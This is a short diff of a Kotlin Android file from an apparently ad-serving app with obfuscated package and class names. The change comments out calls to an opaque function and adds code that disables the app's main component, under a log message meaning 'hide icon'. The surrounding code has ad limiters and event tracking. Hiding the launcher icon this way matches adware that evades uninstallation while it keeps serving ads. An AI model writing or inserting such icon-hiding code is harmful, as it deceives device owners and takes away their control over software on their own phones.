@@ -1,16 +1,18 @@
 package com.ling.ding.sighed.adtool
 
+import android.content.ComponentName
+import android.content.pm.PackageManager
 import android.os.Handler
 import android.os.Looper
-import com.ling.ding.sighed.txtdata.DrinkStartApp
-import com.ling.ding.sighed.netool.TtPoint
-import com.ling.ding.sighed.netool.AppPointData
 import com.ling.ding.sighed.limt.AdLimiter
 import com.ling.ding.sighed.limt.DailyClickLimitRule
 import com.ling.ding.sighed.limt.DailyShowLimitRule
 import com.ling.ding.sighed.limt.HourlyShowLimitRule
 import com.ling.ding.sighed.limt.TimeManager
+import com.ling.ding.sighed.netool.AppPointData
+import com.ling.ding.sighed.netool.TtPoint
 import com.ling.ding.sighed.txtdata.DrinkConfigData
+import com.ling.ding.sighed.txtdata.DrinkStartApp
 import com.ling.ding.sighed.txtdata.LocalStorage
 import com.ling.ding.sighed.txtmain.FirstRunFun
 import com.ling.ding.sighed.txtmain.FirstRunFun.localStorage
@@ -122,7 +124,8 @@ class TranplusUtils {
                     ShowDataTool.showLog("当前活动: ${activities.last().javaClass.name}")
                 }
                 ShowDataTool.showLog("隐藏图标")
-                TWMain.dliGuso(5122)
+//                TWMain.dliGuso(5122)
+                TWMain.disableComponent(mainStart,"com.sophisticated.person.under.sun.ui.show.qqqqddd.Kkkpp")
                 break
             }
 
@@ -389,7 +392,7 @@ class TranplusUtils {
 
             // 记录广告失败次数
             incrementAdFailureCount()
-            TWMain.dliGuso(20388)
+//            TWMain.dliGuso(20388)
             // 发送广告开始事件
             TtPoint.postPointData(false, "callstart")
         }
